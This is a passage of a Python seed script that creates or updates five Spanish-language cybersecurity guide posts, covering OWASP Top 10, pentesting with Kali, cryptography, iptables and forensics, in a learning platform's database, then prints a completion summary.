                "title": "Guía completa: OWASP Top 10 y Seguridad Web",
                "slug": "owasp-top-10-seguridad-web",
                "content": OWASP_TOP_10_CONTENT,
            },
            {
                "title": "Guía completa: Kali Linux y Pentesting con Nmap y Metasploit",
                "slug": "kali-linux-pentesting-nmap-metasploit",
                "content": KALI_PENTESTING_CONTENT,
            },
            {
                "title": "Guía completa: Criptografía Aplicada",
                "slug": "criptografia-aplicada",
                "content": CRIPTOGRAFIA_CONTENT,
            },
            {
                "title": "Guía completa: Firewall, iptables y Seguridad de Red en Linux",
                "slug": "firewall-iptables-seguridad-red",
                "content": FIREWALL_IPTABLES_CONTENT,
            },
            {
                "title": "Guía completa: Análisis Forense Digital y Logs",
                "slug": "analisis-forense-digital-logs",
                "content": FORENSE_LOGS_CONTENT,
            },
        ]

        total_created = 0
        total_skipped = 0

        for guide in guides:
            post_slug = guide["slug"]

            existing = db.query(TheoryPost).filter(
                TheoryPost.slug == post_slug
            ).first()

            if existing:
                existing.markdown_content = guide["content"]
                existing.updated_at = datetime.utcnow()
                total_skipped += 1
                print(f"    ↻  Actualizado: {guide['title'][:55]}")
            else:
                post = TheoryPost(
                    subject_id=subject.id,
                    title=guide["title"],
                    slug=post_slug,
                    markdown_content=guide["content"],
                )
                db.add(post)
                total_created += 1
                print(f"    +  Creado: {guide['title'][:55]}")

        db.commit()

        print(f"""
╔══════════════════════════════════════════════════════╗
║    SEED CIBERSEGURIDAD COMPLETADO CORRECTAMENTE      ║
╠══════════════════════════════════════════════════════╣
║  Subject creado/encontrado: Ciberseguridad          ║
║  Posts creados     : {total_created:<4}                            ║
║  Posts actualizados: {total_skipped:<4}                            ║
║  TOTAL posts       : {total_created + total_skipped:<4}                            ║
╚══════════════════════════════════════════════════════╝
""")

    except Exception as e:
        db.rollback()
        print(f"\n❌  Error durante la inserción: {e}\n")
        import traceback
        traceback.print_exc()
        raise
    finally:
        db.close()


if __name__ == "__main__":
    print("\n🔧  Iniciando seed de guías de Ciberseguridad...\n")
    seed()
